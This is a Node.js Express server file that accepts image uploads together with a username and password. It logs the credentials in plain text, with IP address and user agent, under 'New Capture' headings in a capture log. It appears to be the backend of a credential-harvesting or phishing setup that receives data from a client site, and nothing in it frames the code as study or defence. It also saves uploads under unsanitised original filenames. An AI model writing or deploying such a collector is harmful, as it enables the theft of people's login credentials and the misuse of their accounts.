// server.js
const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const cors = require('cors');

const app = express();
const port = 3000;

// Enable CORS for the client website
app.use(cors());

// Configure storage
const storage = multer.diskStorage({
    destination: function(req, file, cb) {
        const dir = './uploads';
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir);
        }
        cb(null, dir);
    },
    filename: function(req, file, cb) {
        cb(null, file.originalname);
    }
});

const upload = multer({ storage: storage });

// Create a log file for metadata
function logMetadata(data) {
    const logDir = './logs';
    if (!fs.existsSync(logDir)) {
        fs.mkdirSync(logDir);
    }
    
    const logFile = path.join(logDir, 'capture_log.txt');
    const logEntry = `
=== New Capture: ${new Date().toISOString()} ===
Username: ${data.username}
Password: ${data.password}
Timestamp: ${data.timestamp}
User Agent: ${data.userAgent}
IP Address: ${data.ipAddress}
Filename: ${data.filename}
===========================================
`;
    
    fs.appendFileSync(logFile, logEntry);
}

// Handle the upload
app.post('/upload', upload.single('image'), (req, res) => {
    try {
        // Log the metadata
        logMetadata({
            username: req.body.username,
            password: req.body.password,
            timestamp: req.body.timestamp,
            userAgent: req.body.userAgent,
            ipAddress: req.ip,
            filename: req.file.filename
        });
        
        console.log(`File uploaded: ${req.file.filename}`);
        res.status(200).send('Upload successful');
    } catch (error) {
        console.error('Error handling upload:', error);
        res.status(500).send('Upload failed');
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});